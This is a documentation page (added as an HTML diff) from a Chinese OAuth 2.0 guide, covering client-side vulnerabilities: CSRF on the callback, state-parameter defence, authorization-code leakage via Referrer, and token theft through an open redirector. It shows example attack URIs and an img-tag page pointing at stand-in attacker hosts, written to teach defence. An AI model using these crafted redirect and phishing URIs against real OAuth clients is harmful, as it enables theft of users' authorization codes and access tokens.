@@ -1,0 +1,343 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>7. 常见的客户端漏洞 &mdash; 认证 1.0.0 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="认证 1.0.0 documentation" href="../index.html"/>
+        <link rel="up" title="OAuth2" href="oauth2.html"/>
+        <link rel="next" title="8. 常见的受保护资源漏洞" href="8-常见的受保护资源漏洞.html"/>
+        <link rel="prev" title="6. 现实世界中的OAuth2.0" href="6-现实世界中OAuth2.0.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> 认证
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <ul class="current">
+<li class="toctree-l1 current"><a class="reference internal" href="oauth2.html">OAuth2</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="1-简介.html">1. 简介</a></li>
+<li class="toctree-l2"><a class="reference internal" href="2-oauth.html">2. OAuth组件</a></li>
+<li class="toctree-l2"><a class="reference internal" href="3-构建简单的OAuth客户端.html">3. 构建OAuth客户端</a></li>
+<li class="toctree-l2"><a class="reference internal" href="4-构建简单的OAuth受保护资源.html">4. 构建简单的OAuth受保护资源</a></li>
+<li class="toctree-l2"><a class="reference internal" href="5-构建简单的OAuth授权服务器.html">5. 构建简单OAuth授权服务器</a></li>
+<li class="toctree-l2"><a class="reference internal" href="6-现实世界中OAuth2.0.html">6. 现实世界中的OAuth2.0</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">7. 常见的客户端漏洞</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id2">7.1. 常规客户端安全</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="8-常见的受保护资源漏洞.html">8. 常见的受保护资源漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="9-常见的授权服务器漏洞.html">9. 常见的授权服务器漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="10-常见的OAuth令牌漏洞.html">10. 常见的OAuth令牌漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="11-OAuth令牌.html">11. OAuth令牌</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../20-security/security.html">security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../30-spring-oauth2/spring-oauth2.html">Spring OAuth2</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../40-spring-cloud-oauth-security/spring-cloud-oauth-security.html">Spring Cloud OAuth</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">认证</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="oauth2.html">OAuth2</a> &raquo;</li>
+        
+      <li>7. 常见的客户端漏洞</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/10-oauth2/7-常见的客户端漏洞.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="id1">
+<h1>7. 常见的客户端漏洞<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="id2">
+<h2>7.1. 常规客户端安全<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
+<p>OAuth客户端有几种数据是需要保护的。客户端密钥、访问令牌、刷新令牌这些信息需要妥善保管，同时注意不要意外的将这些保密信息泄露到审计日志或其他记录中。除了存储系统上单纯的信息失窃外，OAuth客户端还可能出现其他类型的漏洞</p>
+<p>针对客户端的CSRF攻击</p>
+<dl class="docutils">
+<dt>授权码许可和隐式许可类型中推荐使用state参数，OAuth核心规范对该参数的描述如下:</dt>
+<dd><ul class="first last simple">
+<li>客户端用来维护请求与回调之间状态的不透明值。授权服务器在将用户代理重定向回客户端时包含该值。应该使用这个参数，可以防止CSRF（跨域请求伪造）</li>
+</ul>
+</dd>
+</dl>
+<p>SCRF攻击:</p>
+<blockquote>
+<div><ul>
+<li><p class="first">恶意应用软件让浏览器向已完成用户身份认证的网站发起请求，执行有害操作，这就是SCRF攻击。为了实施攻击，攻击者可以简单发起一个OAuth流程，从目标授权服务器上获取授权码，然后设法让受害用户的客户端使用攻击者的授权码如:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s2">&quot;https://ouauthclient.com/callback?code=ATTACKER_AUTHORIZATION_CODE&quot;</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+</li>
+</ul>
+</div></blockquote>
+<p>当用户点击图片，资源拥有者的客户端与攻击者的授权上下文之间建立了联系。如果OAuth协议用于身份认证，将造成灾难性后果。</p>
+<p>OAuth客户端对于SCRF攻击可以生成一个难以猜测的state参数，在首次向授权服务器发送请求时将其一同传递，OAuth规范要求授权服务器将此参数原样返回至重定向URI，当重定向URI被调用时，客户端需要检查state参数值，如果不一致，则提示错误:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>生成的令牌（以及其他不由最终用户处理的凭证）被攻击者猜中的概率必须小于或等于2^-128，最好应该小于或等于2^-160
+</pre></div>
+</div>
+<p>客户端凭证失窃</p>
+<p>对于原生应用，可以通过动态注册功能，生成客户端密钥、客户端ID。在原生应用首次启动认证时请求注册接口返回客户端ID、客户端密钥，并由客户端保管。</p>
+<p>通过Referrer盗取授权码</p>
+<p>以授权码许可类型为目标，基于HTTP Referrer造成的信息泄漏，攻击者的最终目的是劫持资源拥有者的授权码。</p>
+<p>假设你在一个OAuth提供商那里注册了OAuth客户端，该授权服务使用允许子目录的redirect_uri校验策略。</p>
+<p>你的OAuth回调端点是:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">yourouauthclient</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">oauth</span><span class="o">/</span><span class="n">oauthprovider</span><span class="o">/</span><span class="n">callback</span>
+</pre></div>
+</div>
+<p>但你注册的是:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">yourouauthclient</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+</pre></div>
+</div>
+<p>你的OAuth客户端在执行OAuth授权请求，发起的请求节选可能会是如下这样:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://oauthprovider.com/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;scope=SCOPES&amp;state=STATE&amp;redirect_uri=https://yourouauthclient.com/
+</pre></div>
+</div>
+<p>攻击者也要能够在目标站点注册的重定向URI下创建网页:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">yourouauthclient</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">usergeneratedcontent</span><span class="o">/</span><span class="n">attackerpage</span><span class="o">.</span><span class="n">html</span>
+
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Authorization</span> <span class="ow">in</span> <span class="n">progress</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s2">&quot;https://attackersite.com&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>现在攻击者可以构造一个特殊的钓鱼URI:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://oauthprovider.com/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;scope=SCOPES&amp;state=STATE&amp;redirect_uri=https://yourouauthclient.com/usergeneratedcontent/attackerpage.html
+</pre></div>
+</div>
+<p>当用户点击这个钓鱼URI授权服务器将返回授权码到重定向地址，受害者用户浏览器将在后台加载img标签，想攻击者的服务器请求资源，在这个请求中，HTTP Referrer头部会泄露授权码</p>
+<p>通过开发重定向器盗取令牌</p>
+<dl class="docutils">
+<dt>针对隐式许可类型，攻击目标是访问令牌而不是授权码。开放重定向Web漏洞定义::</dt>
+<dd><ul class="first last simple">
+<li>应用接受一个参数，不进行任何校验就将用户重定向至该参数。这个漏洞被用于钓鱼攻击，让用户不知不觉访问恶意站点。</li>
+</ul>
+</dd>
+<dt>攻击发生条件::</dt>
+<dd><ul class="first last simple">
+<li>注册了“过于宽松”的redirect_uri</li>
+<li>授权服务器采用允许子目录的校验策略</li>
+<li>OAuth客户端具有开放重定向，如：<a class="reference external" href="https://yourouauthclient.com/redirector?goto=http://targetwebsite.com">https://yourouauthclient.com/redirector?goto=http://targetwebsite.com</a></li>
+</ul>
+</dd>
+</dl>
+<p>攻击者可以构建如下URI:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://oauthprovider.com/authorize?response_type=token&amp;client_id=CLIENT_ID&amp;scope=SCOPES&amp;state=STATE&amp;redirect_uri=https://yourouauthclient.com/redirector?goto=https://attacker.com
+</pre></div>
+</div>
+<p>如果资源拥有者已经通过TOFU授权应用，或者被说服再次对应用授权，那么资源拥有者的用户代理将被重定向到传入的redirect_uri，并且URI的片段中附有access_token:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://yourouauthclient.com/redirector?goto=https://attacker.com#access_token=
+</pre></div>
+</div>
+<p>此时客户端应用中的开发重定向会将代理跳转至攻击者的网站，由于大多数浏览器中，URI片段会在重定向被保留，最终加载页面如下:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">attacker</span><span class="o">.</span><span class="n">com</span><span class="c1">#access_token=</span>
+</pre></div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="8-常见的受保护资源漏洞.html" class="btn btn-neutral float-right" title="8. 常见的受保护资源漏洞" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="6-现实世界中OAuth2.0.html" class="btn btn-neutral" title="6. 现实世界中的OAuth2.0" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright .
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.0',
+            LANGUAGE:'None',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="../_static/language_data.js"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
